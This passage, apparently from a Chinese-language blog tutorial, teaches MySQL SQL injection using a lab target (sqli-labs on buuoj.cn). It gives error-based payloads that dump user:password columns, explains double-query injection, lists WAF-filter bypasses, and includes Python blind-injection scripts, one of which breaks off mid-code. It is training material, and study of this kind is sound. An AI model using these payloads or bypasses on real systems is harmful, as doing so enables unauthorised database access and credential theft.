<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<h4 id="0x03-exp-x"><a href="#0x03-exp-x" class="headerlink" title="0x03 exp(x)"></a>0x03 exp(x)</h4><p>返回 e 的 x 次方,当 数据过大 溢出时报错，即 x &gt; 709</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail=&#x27;) or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e))) as asd))--+</span><br></pre></td></tr></table></figure>

<h4 id="0x04-geometrycollection-mysql-版本5-5"><a href="#0x04-geometrycollection-mysql-版本5-5" class="headerlink" title="0x04 geometrycollection() mysql 版本5.5"></a>0x04 geometrycollection() mysql 版本5.5</h4><p>（1）函数解释：<br>GeometryCollection是由1个或多个任意类几何对象构成的几何对象。GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）。</p>
<p>（2）官方文档中举例的用法如下：<br>GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))</p>
<p>（3）报错原因：<br>因为MYSQL无法使用这样的字符串画出图形，所以报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select version())a)b)); %23</span><br><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select column_name from information_schema.columns where table_name=&#x27;manage&#x27; limit 0,1)a)b)); %23</span><br><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select distinct concat(0x23,user,0x2a,password,0x23,name,0x23) FROM manage limit 0,1)a)b)); %23</span><br></pre></td></tr></table></figure>

<p>这里和我们上面学过的cancat和上一关学的内置表有两个梦幻联动</p>
<h4 id="0x05-multipoint-mysql-版本5-5"><a href="#0x05-multipoint-mysql-版本5-5" class="headerlink" title="0x05 multipoint() mysql 版本5.5"></a>0x05 multipoint() mysql 版本5.5</h4><p>（1）函数解释：<br>MultiPoint是一种由Point元素构成的几何对象集合。这些点未以任何方式连接或排序。<br> <br>（2）报错原因：<br>同样是因为无法使用字符串画出图形与geometrycollection类似</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and multipoint((select * from(select * from(select version())a)b)); %23</span><br></pre></td></tr></table></figure>

<h4 id="0x06-polygon"><a href="#0x06-polygon" class="headerlink" title="0x06 polygon()"></a>0x06 polygon()</h4><p>polygon来自希腊。 “Poly” 意味 “many” ， “gon” 意味 “angle”.<br>Polygon是代表多边几何对象的平面Surface。它由单个外部边界以及0或多个内部边界定义，其中，每个内部边界定义为Polygon中的1个孔。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or polygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage))asd)asd))--+</span><br></pre></td></tr></table></figure>

<h4 id="0x07-mutipolygon"><a href="#0x07-mutipolygon" class="headerlink" title="0x07 mutipolygon()"></a>0x07 mutipolygon()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or multipolygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage))asd)asd))</span><br></pre></td></tr></table></figure>

<h4 id="0x08-linestring-）"><a href="#0x08-linestring-）" class="headerlink" title="0x08 linestring(）"></a>0x08 linestring(）</h4><p>报错原理：<br>mysql的有些几何函数（ 例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() ）对参数要求为几何数据，若不满足要求则会报错，适用于5.1-5.5版本 (5.0.中存在但是不会报错)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) and linestring((select * from(select * from(select database())a)b))--+;</span><br></pre></td></tr></table></figure>

<h4 id="0x09-multilinestring"><a href="#0x09-multilinestring" class="headerlink" title="0x09 multilinestring()"></a>0x09 multilinestring()</h4><p>同上</p>
<h4 id="0x0a-ST-LatFromGeoHash-（mysql-5-7-x）"><a href="#0x0a-ST-LatFromGeoHash-（mysql-5-7-x）" class="headerlink" title="0x0a ST.LatFromGeoHash()（mysql&gt;&#x3D;5.7.x）"></a>0x0a ST.LatFromGeoHash()（mysql&gt;&#x3D;5.7.x）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or ST_LatFromGeoHash((select * from(select * from(select (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e))))a)b))--+</span><br></pre></td></tr></table></figure>

<h4 id="0x0b-ST-LongFromGeoHash"><a href="#0x0b-ST-LongFromGeoHash" class="headerlink" title="0x0b ST.LongFromGeoHash"></a>0x0b ST.LongFromGeoHash</h4><p>同上 嵌套查询</p>
<h4 id="0x0c-ST-Pointfromgeohash-mysql-5-7"><a href="#0x0c-ST-Pointfromgeohash-mysql-5-7" class="headerlink" title="0x0c ST_Pointfromgeohash (mysql&gt;5.7)"></a>0x0c ST_Pointfromgeohash (mysql&gt;5.7)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#获取数据库版本信息</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash(version(),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = &#x27;manage&#x27; limit 0,1),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,&#x27;:&#x27;,`password`) from manage),0x23)),1)--+</span><br></pre></td></tr></table></figure>

<h4 id="0x0d-GTID-MySQL-5-6-X-显错"><a href="#0x0d-GTID-MySQL-5-6-X-显错" class="headerlink" title="0x0d GTID (MySQL &gt;&#x3D; 5.6.X - 显错&lt;&#x3D;200)"></a>0x0d GTID (MySQL &gt;&#x3D; 5.6.X - 显错&lt;&#x3D;200)</h4><p><strong>0x01 GTID</strong><br>GTID是MySQL数据库每次提交事务后生成的一个全局事务标识符，GTID不仅在本服务器上是唯一的，其在复制拓扑中也是唯一的</p>
<blockquote>
<p>GTID的表现形式 -&gt; GTID &#x3D;source_id:transaction_id其中source_id一般为数据库的uuid，transaction_id为事务ID，从1开始3E11FA47-71CA-11E1-9E33-C80AA9429562:23如上面的GTID可以看出该事务为UUID为3E11FA47-71CA-11E1-9E33-C80AA9429562的数据库的23号事务</p>
</blockquote>
<p><strong>GTID集合</strong>(一组全局事务标识符)：<br>GTID集合为多个单GTID和一个范围内GTID的集合，他主要用于如下地方</p>
<ul>
<li>gtid_executed 系统变量</li>
<li>gtid_purged系统变量</li>
<li>GTID_SUBSET() 和 GTID_SUBTRACT()函数</li>
</ul>
<p>格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3E11FA47-71CA-11E1-9E33-C80AA9429562:1-5</span><br></pre></td></tr></table></figure>

<p><strong>0X02 函数详解</strong></p>
<p>GTID_SUBSET() 和 GTID_SUBTRACT() 函数，我们知道他的输入值是 GTIDset ，当输入有误时，就会报错</p>
<ol>
<li>GTID_SUBSET( set1 , set2 ) - 若在 set1 中的 GTID，也在 set2 中，返回 true，否则返回 false ( set1 是 set2 的子集)</li>
<li>GTID_SUBTRACT( set1 , set2 ) - 返回在 set1 中，不在 set2 中的 GTID 集合 ( set1 与 set2 的差集)<br>正常情况如下</li>
</ol>
<blockquote>
<p>GTID_SUBSET(‘3E11FA47-71CA-11E1-9E33-C80AA9429562:23’,‘3E11FA47-71CA-11E1-9E33-C80AA9429562:21-57’)GTID_SUBTRACT(‘3E11FA47-71CA-11E1-9E33-C80AA9429562:21-57’,‘3E11FA47-71CA-11E1-9E33-C80AA9429562:20-25’)</p>
</blockquote>
<p><strong>0x03 注入过程( payload )</strong></p>
<p><strong>GTID_SUBSET函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p><strong>GTID_SUBTRACT</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p>上面是一些常见或者不常见的能够报错注入的函数，报错注入就是利用这些函数，在我们的查询语句中的这些函数内的某个位置再嵌套一个子查询，利用产生的报错将子查询的结果回显出来，每个报错注入的函数都搭配了网上找到的简单的payload，情况总是在变化，注意一下函数中子查询所在的位置即可。</p>
<h6 id="使用不存在的函数来报错"><a href="#使用不存在的函数来报错" class="headerlink" title="使用不存在的函数来报错"></a>使用不存在的函数来报错</h6><p><a target="_blank" rel="noopener" href="https://b3logfile.com/siyuan/1621238442570/assets/image-20211126104156-twt8ddd.png"><img src="https://b3logfile.com/siyuan/1621238442570/assets/image-20211126104156-twt8ddd.png" alt="img"></a></p>
<p>随便使用一个不存在的函数，可能会得到当前所在的数据库名称。</p>
<h6 id="使用-join-using-报错获取列名"><a href="#使用-join-using-报错获取列名" class="headerlink" title="使用 join using() 报错获取列名"></a>使用 join using() 报错获取列名</h6><ul>
<li>一般应用于<strong>无列名注入</strong>，下文绕过中会细讲。</li>
</ul>
<blockquote>
<p>通过关键字join可建立两个表之间的内连接。通过对想要查询列名所在的表与其自身内连接，会由于冗余的原因（相同列名存在），而发生错误。并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。</p>
</blockquote>
<p>下面演示如何通过join…using来获取列名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 获取第一列的列名:</span><br><span class="line">1&#x27; union select * from (select * from users as a join users as b)as c#</span><br><span class="line"></span><br><span class="line"># 使用using()依次获取后续的列名</span><br><span class="line">1&#x27; union all select * from (select * from users as a join users b using(id))c#</span><br><span class="line">1&#x27; union all select * from (select * from users as a join users b using(id,username))c#</span><br><span class="line">1&#x27; union all select * from (select * from users as a join users b using(id,username,password))c#</span><br><span class="line"># 数据库中as主要作用是起别名, 常规来说as都可以省略，但是为了增加可读性, 不建议省略</span><br></pre></td></tr></table></figure>

<h5 id="注入流程-1"><a href="#注入流程-1" class="headerlink" title="注入流程"></a>注入流程</h5><p>大体的注入流程就是在联合查询不成功的情况下尝试使用报错注入的函数得到回显子查询结果的报错结果。</p>
<h4 id="双报错注入详解："><a href="#双报错注入详解：" class="headerlink" title="双报错注入详解："></a>双报错注入详解：</h4><p>在此之前，我们理解一下子查询，查询的关键字是select，这个大家都知道。子查询可以简单的理解在一个select语句里还有一个select。里面的这个select语句就是子查询。</p>
<p>看一个简单的例子：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Select <span class="title">concat</span><span class="params">((select database()))</span></span>;</span><br></pre></td></tr></table></figure>

<p>真正执行的时候，先从子查询进行。因此执行select database() 这个语句就会把当前的<a target="_blank" rel="noopener" href="http://www.2cto.com/database/">数据库</a>查出来，然后把结果传入到<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=concat&spm=1001.2101.3001.7020">concat</a>函数。这个函数是用来连接的。比如 concat(‘a’,’b’)那结果就是ab了。</p>
<p>原理：</p>
<p>双注入查询需要理解四个函数&#x2F;语句</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="built_in">Rand</span>() <span class="comment">//随机函数</span></span><br><span class="line"><span class="number">2.</span> <span class="built_in">Floor</span>() <span class="comment">//取整函数</span></span><br><span class="line"><span class="number">3.</span> <span class="built_in">Count</span>() <span class="comment">//汇总函数</span></span><br><span class="line"><span class="number">4.</span> Group by clause <span class="comment">//分组语句</span></span><br></pre></td></tr></table></figure>

<p>简单的一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。[本博主注:这个是Mysql的bug，详见<a target="_blank" rel="noopener" href="https://blog.csdn.net/lixiangminghate/article/details/80466333">链接</a>]</p>
<p>以本地一个名为Security的数据库为例</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SELECT <span class="title">CONCAT</span><span class="params">((SELECT database()), FLOOR(RAND()*<span class="number">2</span>))</span></span>;</span><br></pre></td></tr></table></figure>

<p>不要怕。先看最里面的SELECT database() 这个就返回数据库名，这里就是security了。然后FLOOR(RAND()*2)这个上面说过了。不是0，就是1.然后把这两个的结果进行concat连接，那么结果不是security0就是security1了。</p>
<p><img src="https://img-blog.csdn.net/20180527000303157" alt="img"></p>
<p>如果我们把这条语句后面加上from 一个表名。那么一般会返回security0或security1的一个集合。数目是由表本身有几条结果决定的。比如一个管理表里有5个管理员。这个就会返回五条记录，这里users表里有13个用户，所以返回了13条</p>
<p><img src="https://img-blog.csdn.net/20180527000350116" alt="img"></p>
<p>如果是从information_schema.schemata里，这个表里包含了mysql的所有数据库名。这里本机有三个数据库。所以会返回三个结果</p>
<p><img src="https://img-blog.csdn.net/2018052700044918" alt="img"></p>
<p>现在我们准备加上Group By 语句了。<br>我们使用information_schema.tables 或 information_schema.columns者两个表来查询。因为表里面一般数据很多。容易生成很多的随机值，不至于全部是security0，这样就不能查询出结果了。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">select <span class="title">concat</span><span class="params">((select database()), floor(rand()*<span class="number">2</span>))</span>as a from information_schema.tables group by a</span>;</span><br></pre></td></tr></table></figure>

<p>这里我先解释一下。</p>
<p>我们把concat((select database()), floor(rand()*2)) 这个结果取了一个别名 a ，然后使用他进行分组。这样相同的security0分到一组，security1分到一组。就剩下两个结果了。</p>
<p><img src="https://img-blog.csdn.net/2018052700054078" alt="img"></p>
<p>注意这里的database()可以替换成任何你想查的函数，比如version(), user(), datadir()或者其他的查询。比如查表啊。查列啊。原理都是一样的。</p>
<p>最后的亮点来了。。</p>
<p>我们输入这条：注意多了一个聚合函数count(*)</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">select <span class="title">count</span><span class="params">(*)</span>, <span class="title">concat</span><span class="params">((select database()), floor(rand()*<span class="number">2</span>))</span>as a from information_schema.tables group by a</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdn.net/20180527000625891" alt="img"></p>
<p>报错了</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry <span class="string">&#x27;security1&#x27;</span> <span class="keyword">for</span> key ‘group_key’</span><br></pre></td></tr></table></figure>

<p>原因是重复的键值。</p>
<p>可以看到security就是我们的查询结果了</p>
<p>想要查询版本就这样：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">select <span class="title">count</span><span class="params">(*)</span>, <span class="title">concat</span><span class="params">((select version()), floor(rand()*<span class="number">2</span>))</span>as a from information_schema.tables group by a</span>;</span><br></pre></td></tr></table></figure>

<p>看看替换了database()为version()</p>
<p><img src="https://img-blog.csdn.net/20180527000746699" alt="img"></p>
<p>再看一个</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">select <span class="title">count</span><span class="params">(*)</span>, <span class="title">concat</span><span class="params">(<span class="string">&#x27;~&#x27;</span>,(select user()),<span class="string">&#x27;~&#x27;</span>, floor(rand()*<span class="number">2</span>))</span>as a from information_schema.tables group by a</span>;</span><br></pre></td></tr></table></figure>

<p>报错</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry <span class="string">&#x27;~root@localhost~1&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;group_key&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这里的~这个符号只是为了让结果更清晰。</p>
<h2 id="“常见”绕过："><a href="#“常见”绕过：" class="headerlink" title="“常见”绕过："></a>“常见”绕过：</h2><h4 id="结尾注释符绕过"><a href="#结尾注释符绕过" class="headerlink" title="结尾注释符绕过"></a>结尾注释符绕过</h4><p>Mysql中常见的注释符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">、#    %23    --+或-- -    ;%00</span><br></pre></td></tr></table></figure>

<p>如果所有的注释符全部被过滤了，把我们还可以尝试直接使用引号进行闭合，这种方法很好用。</p>
<h4 id="字符串变换绕过"><a href="#字符串变换绕过" class="headerlink" title="字符串变换绕过"></a>字符串变换绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 大小写绕过</span><br><span class="line">-1&#x27; UnIoN SeLeCt 1,2,database()--+</span><br><span class="line"></span><br><span class="line"># 双写绕过</span><br><span class="line">-1&#x27; uniunionon selselectect 1,2,database()--+</span><br><span class="line"></span><br><span class="line"># 字符串拼接绕过</span><br><span class="line">1&#x27;;set @a=concat(&quot;sel&quot;,&quot;ect * from users&quot;);prepare sql from @a;execute sql;</span><br></pre></td></tr></table></figure>

<h4 id="过滤-and、or-绕过"><a href="#过滤-and、or-绕过" class="headerlink" title="过滤 and、or 绕过"></a>过滤 and、or 绕过</h4><h5 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and =&gt; &amp;&amp;</span><br><span class="line">or =&gt; ||</span><br></pre></td></tr></table></figure>

<h5 id="使用-进行异或盲注绕过"><a href="#使用-进行异或盲注绕过" class="headerlink" title="使用^进行异或盲注绕过"></a>使用^进行异或盲注绕过</h5><blockquote>
<p>异或运算规则:<br><code>1^1=0 0^0=0 0^1=1</code><br><code>1^1^1=0 1^1^0=0</code><br>构造payload:<code>&#39;^ascii(mid(database(),1,1)=98)^0</code></p>
</blockquote>
<p>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的.</p>
<h4 id="过滤空格绕过"><a href="#过滤空格绕过" class="headerlink" title="过滤空格绕过"></a>过滤空格绕过</h4><p>以下字符可以代替空格：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 使用注释符/**/代替空格:</span><br><span class="line">select/**/database();</span><br><span class="line"></span><br><span class="line"># 使用加号+代替空格:(只适用于GET方法中)</span><br><span class="line">select+database();</span><br><span class="line"># 注意: 加号+在URL中使⽤记得编码为%2B: select%2Bdatabase(); (python中不用)</span><br><span class="line"></span><br><span class="line"># 使⽤括号嵌套:</span><br><span class="line">select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());</span><br><span class="line"></span><br><span class="line"># 使⽤其他不可⻅字符代替空格:</span><br><span class="line">%09, %0a, %0b, %0c, %0d, %a0</span><br><span class="line"></span><br><span class="line">#利用``分隔进行绕过</span><br><span class="line">select host,user from user where user=&#x27;a&#x27;union(select`table_name`,`table_type`from`information_schema`.`tables`);</span><br></pre></td></tr></table></figure>

<p>同时任然可以利用异或符号进行盲注，我i们可以看到上面的payload中完全可以不存在空格。</p>
<h4 id="过滤括号绕过"><a href="#过滤括号绕过" class="headerlink" title="过滤括号绕过"></a>过滤括号绕过</h4><h5 id="利用-order-by-进行布尔盲注"><a href="#利用-order-by-进行布尔盲注" class="headerlink" title="利用 order by 进行布尔盲注"></a>利用 order by 进行布尔盲注</h5><p>上面有</p>
<h4 id="过滤比较符号（-、）绕过"><a href="#过滤比较符号（-、）绕过" class="headerlink" title="过滤比较符号（&#x3D;、&lt;、&gt;）绕过"></a>过滤比较符号（&#x3D;、&lt;、&gt;）绕过</h4><p>比较符号一般也只出现在盲注中，所以都尽可能搭配了脚本。</p>
<h5 id="使用-in-绕过"><a href="#使用-in-绕过" class="headerlink" title="使用 in() 绕过"></a>使用 in() 绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?id=&#x27; or ascii(substr((select database()),1,1)) in(114)--+    // 错误</span><br><span class="line">/?id=&#x27; or ascii(substr((select database()),1,1)) in(115)--+    // 正常回显</span><br><span class="line"></span><br><span class="line">/?id=&#x27; or substr((select database()),1,1) in(&#x27;s&#x27;)--+    // 正常回显</span><br></pre></td></tr></table></figure>

<p>综上所述，很明显和普通的布尔盲注差不多，于是写个GET的二分法盲注脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        for j in range(37,128):</span><br><span class="line">            url = &quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;.format(i,j)</span><br><span class="line">            r = requests.get(url=url)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                flag += chr(j)</span><br><span class="line">                print(flag)</span><br></pre></td></tr></table></figure>

<h5 id="LIKE-注入"><a href="#LIKE-注入" class="headerlink" title="LIKE 注入"></a>LIKE 注入</h5><p>在LIKE子句中，百分比(%)通配符允许<strong>匹配任何字符串的零个或多个字符</strong>。下划线 <code>_</code> 通配符允许<strong>匹配任何单个字符</strong>。<strong>匹配成功则返回1，反之返回0</strong>，可用于sql盲注。</p>
<ol>
<li>判断数据库长度</li>
</ol>
<p>可用length()函数，也可用<code>_</code>，如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=&#x27; or database() like &#x27;________&#x27;--+  // 回显正常</span><br></pre></td></tr></table></figure>

<ol>
<li>判断数据库名</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?id=&#x27; or database() like &#x27;s%&#x27; --+</span><br><span class="line">/?id=&#x27; or (select database()) like &#x27;s%&#x27; --+</span><br><span class="line">或者:</span><br><span class="line">/?id=&#x27; or database() like &#x27;s_______&#x27; --+</span><br><span class="line">/?id=&#x27; or (select database()) like &#x27;s_______&#x27; --+</span><br></pre></td></tr></table></figure>

<p>如上图所示，回显正常，说明数据库名的第一个字符是s。</p>
<p>综上所述，很明显和普通的布尔盲注差不多，于是写个GET的二分法盲注脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># strs = string.printable</span><br><span class="line">strs = string.ascii_letters + string.digits + &#x27;_&#x27;</span><br><span class="line">url = &quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or (select database()) like &#x27;&#123;&#125;%&#x27;--+&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, 40):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payloads = payload.format(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j, end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char == &#x27;#&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<h5 id="REGEXP-注入"><a href="#REGEXP-注入" class="headerlink" title="REGEXP 注入"></a>REGEXP 注入</h5><p>REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。</p>
<ol>
<li>判断数据库长度</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=&#x27; or (length(database())) regexp 8 --+  // 回显正常</span><br></pre></td></tr></table></figure>

<ol>
<li>判断数据库名</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?id=&#x27; or database() regexp &#x27;^s&#x27;--+    // 回显正常</span><br><span class="line">/?id=&#x27; or database() regexp &#x27;se&#x27;--+    // 回显正常, 不适用^和$进行匹配也可以</span><br><span class="line">/?id=&#x27; or database() regexp &#x27;^sa&#x27;--+   // 报错</span><br><span class="line">/?id=&#x27; or database() regexp &#x27;y$&#x27;--+    // 回显正常</span><br></pre></td></tr></table></figure>

<p>脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># strs = string.printable</span><br><span class="line">strs = string.ascii_letters + string.digits + &#x27;_&#x27;</span><br><span class="line">url = &quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or (select database()) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, 40):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in 